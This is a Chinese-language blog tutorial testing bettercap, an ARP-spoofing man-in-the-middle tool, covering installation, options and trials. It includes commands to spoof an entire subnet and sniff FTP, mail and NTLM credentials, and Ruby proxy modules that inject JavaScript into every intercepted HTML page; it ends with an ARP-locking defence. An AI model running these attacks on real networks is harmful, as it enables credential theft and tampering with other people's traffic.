# 中间人攻击利用框架bettercap测试

0x00前言
------

* * *

上篇提到内网渗透很有趣，这次就从一款新工具说起: bettercap

0x01简介
------

* * *

bettercap可用来实现各种中间人攻击，模块化，便携、易扩展

0x02特点
------

* * *

提到中间人攻击，最知名的莫过于ettercap，而开发bettercap的目的不是为了追赶它，而是替代它 原因如下：

> 1、ettercap很成功，但在新时代下它已经老了 2、ettercap的过滤器复杂，使用门槛高 3、在大型网络下，主机发现功能效果很差 4、优化不够，对研究人员来说，无用的功能太多 5、扩展性不够，开发需要掌握C/C++语言

0x03测试环境搭建
----------

* * *

kali linux：

```
git clone https://github.com/evilsocket/bettercap
cd bettercap
gem build bettercap.gemspec
sudo gem install bettercap*.gem

```

如果报错，如图：

![这里写图片描述](http://drops.javaweb.org/uploads/images/c128ff2b13f31bf8b4edef1650b86137c90c090f.jpg)

执行如下命令：

```
sudo apt-get install ruby-dev libpcap-dev
sudo gem install bettercap*.gem   

```

最后成功，如图：

![这里写图片描述](http://drops.javaweb.org/uploads/images/0798f7c5d4aed65bc41f261378b718a7c4b234d7.jpg)

0x04参数说明
--------

* * *

已做翻译并加入个人理解

用法:

> -I, --interface IFACE 指定Network interface name，默认eth0
> 
> -S, --spoofer NAME 指定欺骗模块，此参数默认为ARP，目前仅支持ARP，新版本会添加更多选项
> 
> -T, --target ADDRESS 指定单一ip，如果未设置，则代表所有子网，子网所有主机自动扫描，简单高效，十分推荐  
> -O, --log LOG_FILE 日志功能
> 
> -D, --debug 调试功能，会将每一步操作详细记录，便于调试
> 
> -L, --local 解析流经本机的所有数据包（此操作会开启嗅探器），此参数默认为关闭
> 
> -X, --sniffer 开启嗅探器. --sniffer-pcap FILE 将数据包保存为PCAP文件，可用Wireshark打开（此操作会开启嗅探器） --sniffer-filter EXPRESSION 配置嗅探器使用BPF过滤器（此操作会开启嗅探器）
> 
> -P, --parsers PARSERS 指定数据包（此操作会开启嗅探器），支持NTLMSS, IRC, POST, URL, FTP, HTTPS, HTTPAUTH, MAIL，此参数默认为所有 --no-discovery 只使用当前的ARP缓存，不去扫描其他主机，此参数默认为关闭 --no-spoofing 关闭欺骗模块，也可以使用参数--spoofer NONE代替 --proxy 启用HTTP代理并且重定向所有HTTP请求至本机，此参数默认为关闭 --proxy-port PORT 设置HTTP代理端口，此参数默认为8080 --proxy-module MODULE 指定加载的Ruby模块 --httpd 开启HTTP服务器，此参数默认为关闭 --httpd-port PORT 指定HTTP server port, 此参数默认为8081. --httpd-path PATH 指定HTTP server path,此参数默认为 ./.
> 
> -h, --help 英文帮助

0x05功能测试
--------

* * *

### 1、HOST DISCOVERY + ARP MAN IN THE MIDDLE

```
sudo bettercap -X

```

扫描全部内网主机，傻瓜式操作，自动扫描并进行arp欺骗，使所有流量经过本机，如图![这里写图片描述](http://drops.javaweb.org/uploads/images/f997588db35212162b8434ad56979d82216d8daf.jpg)

### 2、CREDENTIALS SNIFFER

抓取流量中有价值的信息，包括：

```
URLs being visited.
HTTPS host being visited.
HTTP POSTed data.
HTTP Basic and Digest authentications.
FTP credentials.
IRC credentials.
POP, IMAP and SMTP credentials.
NTLMv1/v2 ( HTTP, SMB, LDAP, etc ) credentials.

```

用法举例：

默认傻瓜模式，开启所有功能:

```
sudo bettercap -X

```

如图为抓到的163邮箱登陆数据

![这里写图片描述](http://drops.javaweb.org/uploads/images/ddca0240f0ef8a5b201befb5d85ed50f355587a7.jpg)

指定抓取的数据包:

```
sudo bettercap -X -P "FTP,HTTPAUTH,MAIL,NTLMSS"

```

如图为抓到192.168.40.146的FTP

![这里写图片描述](http://drops.javaweb.org/uploads/images/7ba99e8d6eb43d478a00445afb953777c266784b.jpg)

### 3、MODULAR TRANSPARENT PROXY

代理功能，可以拦截篡改HTTP流量

用法举例：

开启代理功能：

```
sudo bettercap --proxy

```

开启代理功能并指定端口：

```
sudo bettercap --proxy --proxy-port=8081

```

关闭arp欺骗，只开启代理

```
sudo bettercap -S NONE --proxy

```

开启代理功能并加载指定的Ruby模块

```
sudo bettercap --proxy --proxy-module=hack_title.rb

```

Ruby参考示例：

```
class HackTitle < Proxy::Module
  def on_request( request, response )
    # is it a html page?
    if response.content_type == 'text/html'
      Logger.info "Hacking http://#{request.host}#{request.url} title tag"
      # make sure to use sub! or gsub! to update the instance
      response.body.sub!( '<title>', '<title> !!! HACKED !!! ' )
    end
  end
end

```

功能为替换所有html的标题选项

### 4、BUILTIN HTTP SERVER

内置HTTP SERVER功能，可篡改HTTP响应包内容

用法举例：

在网络的每一个HTTP响应中注入JS文件

```
sudo bettercap --httpd --http-path=/path/to/your/js/file/ --proxy --proxy-module=inject.rb

```

Ruby参考示例：

```
class InjectJS < Proxy::Module
  def on_request( request, response )
    # is it a html page?
    if response.content_type == 'text/html'
      Logger.info "Injecting javascript file into http://#{request.host}#{request.url} page"
      # get the local interface address and HTTPD port
      localaddr = Context.get.iface[:ip_saddr]
      localport = Context.get.options[:httpd_port]
      # inject the js
      response.body.sub!( '</title>', "</title><script src='http://#{localaddr}:#{localport}/file.js' 

type='text/javascript'></script>" )
    end
  end
end

```

0x06测试心得
--------

* * *

亮点：

> 中间人攻击利用框架的开发，便携，安装简单 整合了各种常用功能，功能模块化，自动欺骗攻击，提高效率 极大降低了工具的使用和开发门槛

### 不足：

```
目前只支持arp欺骗，功能仍需完善。
暂不支持windows

```

0x07总结
------

* * *

之前我用过c++开发arp欺骗&中间人攻击的程序,个人认为arp欺骗的成功与否关键在于ARP缓存表的修改，**锁定ARP缓存表目前就能防御bettercap基于arp的中间人攻击**但我相信，bettercap的前景十分广阔。

0x08补充
------

* * *

bettercap下载地址：

http://www.bettercap.org/

水平有限，欢迎补充。